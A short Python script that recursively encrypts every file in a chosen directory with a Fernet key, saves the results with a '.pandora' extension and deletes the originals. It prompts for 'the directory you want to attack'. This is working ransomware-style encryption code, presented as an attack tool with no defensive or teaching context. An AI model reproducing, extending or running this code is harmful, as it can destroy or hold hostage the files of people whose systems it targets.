from cryptography.fernet import Fernet
import os

def generate_key(key_file_name):
    key = Fernet.generate_key()
    with open(key_file_name, 'wb') as key_file:
        key_file.write(key)
    return key


def encrypt(files, key_file):
    with open(key_file, 'rb') as pandora:
        key = pandora.read()
    f = Fernet(key)
    for file in files:
        with open(file, 'rb') as original_file:
            original = original_file.read()

        encrypted = f.encrypt(original)

        with open(file+".pandora", 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        os.remove(file)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def os_walk(dir):
    file_list = []
    for cur_dir, _, files in os.walk(dir):
        for file in files:
            complete_path = os.path.join(cur_dir, file)
            file_list.append(complete_path)
    return file_list

def key_check():
    key_check = str(input("Do you have an encryption key? [Y/N]: ").upper())
    if key_check == 'N':
        clear()
        key_file_name = str(input("Type a new key file name [Example: mykeyfile.key]: "))
        key_dir = str(input("Type the directory you want it to be created [Example: dir1/dir2/dir3/]: "))
        key_file = key_dir+key_file_name
        print("Generating new encryption key...")
        key = generate_key(key_file)
        print("Encryption key file created successfuly!")
    elif key_check == 'Y':
        clear()
        key_file = str(input("Type the key file directory [Example: dir1/dir2/mykeyfile.key]: "))
        with open(key_file, 'rb') as user_key:
            key = user_key.read()
        print("Encryption key file opened successfuly!")
    return key_file

key_file = key_check()

directory = str(input("Type the directory you want to attack [ATTENTION! ALL files inside this directory will be encrypted!]: "))

files = os_walk(directory)
encrypt(files, key_file)


